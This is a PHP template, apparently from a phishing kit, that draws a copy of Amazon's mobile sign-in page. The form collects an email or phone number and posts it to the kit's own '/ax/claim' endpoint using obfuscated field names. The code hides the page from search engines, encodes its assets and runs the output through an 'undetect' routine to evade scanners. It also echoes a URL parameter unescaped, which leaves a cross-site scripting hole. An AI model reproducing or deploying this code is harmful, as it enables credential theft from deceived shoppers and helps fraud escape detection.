<?php
require __DIR__ . '/../../function.php';
require $api->language();

$api->check_cookie();

$username = isset($_GET['back']) ? $_GET['back'] : null;
$html = '
<!DOCTYPE html>
<html class="a-touch a-mobile a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-hires a-transform3d a-touch-scrolling a-ios a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember awa-browser" data-19ax5a9jf="mongoose" data-aui-build-date="3.25.4-2025-06-19">
<span id="uas-port" data-disabled="true"></span>
<head>
    <title dir="ltr">'.$api->text_encode($lang['login']['title']).'</title>
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=yes">
    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noodp, noydir">
    <link rel="shortcut icon" href="'.$api->image_encode("assets/img/favicon.ico")['local'].'">
    <link rel="stylesheet" href="'.$api->text_encode("../../assets/css/AmazonUI.css").'">
    <meta name="theme-color" content="#131921">
    <style type="text/css">
    .nav-sprite-v3 .nav-sprite {
        background-image: url('.$api->image_encode("assets/img/nav-global-mobile.png")['local'].');
        background-repeat: no-repeat;
    }
    </style>
    <link rel="stylesheet" href="'.$api->text_encode("../../assets/css/NavMobileAssets.css").'">
    <link rel="stylesheet" href="'.$api->text_encode("../../assets/css/InternationalCustomerPreferencesNavMobileAssets.css").'">
    <link rel="stylesheet" href="'.$api->text_encode("../../assets/css/GlowToasterAssets.css").'">
    <link rel="stylesheet" href="'.$api->text_encode("../../assets/css/RetailSearchAutocompleteAssets.css").'">
    <style>
    #aa-challenge-whole-page-iframe {
        overflow:hidden;
        opacity:1.0;
        position:fixed;
        top:0px;
        bottom:0px;
        right:0px;
        border:none;
        margin:0;
        padding:0;
        height:100%;
        width:100%;
        z-index:999999;
    }
    </style>
    <style>
    .a2hs-ingress-container,
    a[href^="#nav-hbm-a2hs-trigger"] {
        display:none!important
    }
    .a2hs-ingress-container.a2hs-ingress-visible,
    a[href^="#nav-hbm-a2hs-trigger"].a2hs-ingress-visible {
        display:block!important
    }
    </style>
    <style>
    @media all and (display-mode:standalone) {
        #chromeless-view-progress-bar,
        #chromeless-view-progress-bar::after {
            position:fixed;
            top:0;
            left:0;
            right:0;
            height:2px
        }
        @keyframes pbAnimation {
            0% {
                right:90%
            }
            100% {
                right:10%
            }
        }
        #chromeless-view-progress-bar {
            background:rgba(255,255,255,.1);
            z-index:9999999
        }
        #chromeless-view-progress-bar::after {
            content:"";
            background:#fcbb6a;
            animation:pbAnimation 10s forwards
        }
    }
    </style>
    <style></style>
</head>
<body class="a-m-de a-aui_72554-c a-aui_a11y_6_837773-c a-aui_killswitch_csa_logger_372963-t1 a-aui_template_weblab_cache_333406-c a-bw_aui_cxc_alert_measurement_1074111-c a-bw_aui_switch_redesign_measurement_1206055-c">
    <div id="a-page">
        <img src="'.$api->image_encode("assets/img/nav-global-mobile.png")['local'].'" style="display:none">
        <style mark="aboveNavInjectionCSS" type="text/css">
        .nav-input[type="submit"] {
            opacity: 0.01;
        }
        </style>
        <header id="nav-main" class="nav-mobile nav-progressive-attribute nav-locale-'.strtolower($_SESSION['countrycode']).' nav-lang-'.strtolower($_SESSION['countrycode']).' nav-ssl nav-unrec nav-blueheaven">
            <div id="navbar" cel_widget_id="Navigation-mobile-navbar" role="navigation" class="nav-t-basicNoAuth nav-sprite-v3 celwidget" data-csa-c-id="slowjq-ssjhuq-vatwq2-66hsh4" data-cel-widget="Navigation-mobile-navbar">
                <div id="nav-logobar">
                    <div class="nav-left">
                        <div id="nav-logo">
                            <a href="#!" id="nav-logo-sprites" class="nav-logo-link nav-progressive-attribute">
                                <span class="nav-sprite nav-logo-base"></span>
                                ';
                                if ($_SESSION['countrycode'] == "jp") {
                                    $html .= '<span class="nav-logo-locale">.co.'.strtolower($_SESSION['countrycode']).'</span>';
                                } else {
                                    $html .= '<span class="nav-logo-locale"></span>';
                                }
                                $html .= '
                            </a>
                        </div>
                    </div>
                    <div class="nav-right"></div>
                </div>
            </div>
            <div id="nav-progressive-subnav"></div>
        </header>
        <link rel="stylesheet" href="'.$api->text_encode("../../assets/css/AuthXClaimCollectionUIAssets.css").'">
            <div class="a-container auth-workflow">
                <div class="a-section">
                    ';
                    if (isset($_GET['error']) && $_GET['error'] == true) {
                    $html .= '
                        <div aria-live="assertive" id="auth-error-message-box" class="a-box a-alert a-alert-error auth-server-side-message-box a-spacing-base" role="alert">
                            <div class="a-box-inner a-alert-container">
                                <h4 class="a-alert-heading">'.$api->text_encode($lang['login']['titlealertsignin']).'</h4>
                                <i class="a-icon a-icon-alert"></i>
                                <div class="a-alert-content">
                                    <ul class="a-unordered-list a-nostyle a-vertical a-spacing-none">
                                        <li>
                                            <span class="a-list-item">
                                                '.$api->text_encode($lang['login']['alertsignin']).'
                                            </span>
                                        </li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                        ';
                    }
                    $html .= '
                    <div class="a-section auth-pagelet-container">
                        <div id="claim-collection-container" aria-live="polite" class="a-section">
                            <h2 class="a-spacing-medium">
                                '.$api->text_encode($lang['login']['signin']).'
                            </h2>
                            <p class="a-spacing-micro a-text-bold">
                                '.$api->text_encode($lang['login']['emailorphone']).'
                            </p>
                            <form method="POST" action="/ax/claim">
                                <div id="claim-input-container" class="a-section a-spacing-micro">
                                    <div data-tab-layout-weblab-treatment="" class="a-input-text-wrapper">
                                        <input type="text" id="username" name="'.$api->encypt("username").'" value="'.$username.'" required="true">
                                    </div>
                                </div>
                                <div id="inputErrorMsgUser"></div>
                                <button type="submit" id="btn_next" class="a-button a-spacing-top-large a-button-span12 a-button-primary">
                                    <span class="a-button-text">'.$api->text_encode($lang['login']['continue']).'</span>
                                </button>
                            </form>
                            <p class="a-spacing-top-medium a-size-small legal-text">
                                '.$api->text_encode($lang['login']['continuing']).'
                                <a href="#gp">'.$api->text_encode($lang['login']['conditions']).'</a> and 
                                <a href="#gp">'.$api->text_encode($lang['login']['privacy']).'</a>.
                            </p>
                            <div class="a-section">
                                <ul class="a-unordered-list a-nostyle a-vertical">
                                    <li>
                                        <span class="a-list-item">
                                            <a class="a-size-base a-link-normal" rel="noopener noopener" href="#gp" role="button">
                                                '.$api->text_encode($lang['login']['needhelp']).'
                                            </a>
                                        </span>
                                    </li>
                                </ul>
                            </div>
                            <div id="ab-registration-link-section" class="a-section">
                                <hr aria-hidden="true" class="a-divider-normal">
                                <div class="a-section a-spacing-micro">
                                    <span class="a-text-bold">
                                        '.$api->text_encode($lang['login']['buyer']).'
                                    </span>
                                </div>
                                <a id="ab-registration-ingress-link" class="a-link-normal" href="#gp">
                                    <span>
                                        '.$api->text_encode($lang['login']['shop']).'
                                    </span>
                                </a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <footer class="nav-mobile nav-ftr-batmobile">
                <div id="nav-ftr" class="nav-t-footer-basicNoAuth nav-sprite-v3">
                    <div class="icp-container-mobile">
                        <style type="text/css">
                        #icp-touch-link-language {
                            display: none;
                        }
                        </style>
                        <div class="icp-touch-link-2" id="icp-touch-link-language">
                            <a href="#gp" class="icp-language-link">
                                <div class="icp-nav-globe-img-2 icp-mobile-globe-2"></div>
                                <span class="icp-color-base">'.$api->text_encode($lang['login']['language']).'</span>
                            </a>
                            <button class="nav-arrow icp-up-down-arrow" aria-controls="nav-flyout-icp-footer-flyout"></button>
                        </div>
                        <style type="text/css">
                            #icp-touch-link-country { display: none; }
                        </style>
                        <a href="#gp" role="button" class="icp-touch-link-2" id="icp-touch-link-country">
                            <span class="icp-flag-3 icp-flag-3-'.strtolower($_SESSION['countrycode']).'"></span>
                            <span class="icp-color-base">'.$_SESSION['country'].'</span>
                        </a>
                    </div>
                    <ul class="nav-ftr-horiz">
                        <li class="nav-li">
                            <a href="#gp" id="" class="nav-a">'.$api->text_encode($lang['login']['conditions']).'</a>
                        </li>
                        <li class="nav-li">
                            <a href="#gp" id="" class="nav-a">'.$api->text_encode($lang['login']['privacy']).'</a>
                        </li>
                        <li class="nav-li">
                            <a href="#gp" id="" class="nav-a">'.$api->text_encode($lang['login']['cookies']).'</a>
                        </li>
                    </ul>
                    <div id="nav-ftr-copyright">
                        '.$api->text_encode($lang['login']['copyright']).'
                    </div>
                    <div id="nav-ftr-legal"></div>
                </div>
            </footer>
        </div>
    </div>
    <script src="'.$api->text_encode("../../assets/js/jquery.min.js").'"></script>
    <script src="'.$api->text_encode("../../assets/js/jquery.mask.min.js").'"></script>
    <script src="'.$api->text_encode("../../assets/js/jquery.validate.min.js").'"></script>
    <script>
        var usernameEmpty = '.json_encode($lang['login']['usernameEmpty']).';
        var usernameInvalid = '.json_encode($lang['login']['usernameInvalid']).';
    </script>
    <script src="'.$api->text_encode("../../assets/js/signin.auth.js").'"></script>
</body>
</html>';

$api->undetect($html);
?>